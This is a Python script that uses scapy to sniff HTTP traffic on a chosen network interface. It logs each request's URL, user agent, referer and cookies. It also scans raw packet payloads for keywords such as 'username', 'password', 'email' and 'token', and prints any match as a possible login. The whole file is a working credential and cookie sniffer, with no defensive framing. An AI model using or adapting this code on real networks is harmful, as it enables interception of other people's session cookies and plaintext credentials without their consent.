#!/usr/bin/env python

import scapy.all as scapy

from scapy.layers import http

from datetime import datetime

from datetime import timedelta

import atexit

from termcolor import colored

from pyfiglet import Figlet


f = Figlet(font='slant')
print(colored(f.renderText("HTTP traffic logger"), 'yellow'))

interface = raw_input("[?] Enter network interface > ")

startTime = datetime.now()

def dt():
    now = datetime.now()
    time = now.time()
    return now.strftime("%d/%m/%Y ") + str(time)

print(colored("\n[+] HTTP-traffic-logger started at " + dt() + "\n", 'yellow'))

requests = 0

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "password", "pass", "email", "mail", "login", "Login", "name", "token"]
        for keyword in keywords:
            if keyword in load:
                return load

class color:
   BOLD = '\033[1m'
   END = '\033[0m'

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] " + dt() +
            " HTTP Request >> Method : " +
            color.BOLD +
            packet[http.HTTPRequest].Method +
            color.END +
            " >> HTTP Version : " +
            packet[http.HTTPRequest].Http_Version)
        print("    URL : " + color.BOLD + url + color.END)
        print("    UserAgent : " + str(packet[http.HTTPRequest].User_Agent))
        print("    Referer : " + str(packet[http.HTTPRequest].Referer))
        print("    Cookie : " + str(packet[http.HTTPRequest].Cookie) + "\n")

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/pass > " + login_info + "\n\n")

        global requests
        requests += 1

def exit_handler():
    totalTime = datetime.now() - startTime
    s = totalTime.seconds
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    print("\n\n" +
        colored("[+] Captured " +
        str(requests) +
        " HTTP requests in " +
        str(h) + " Hours " +
        str(m) + " Minutes " +
        str(s) + " Seconds\n", 'yellow'))


atexit.register(exit_handler)


sniff(interface)
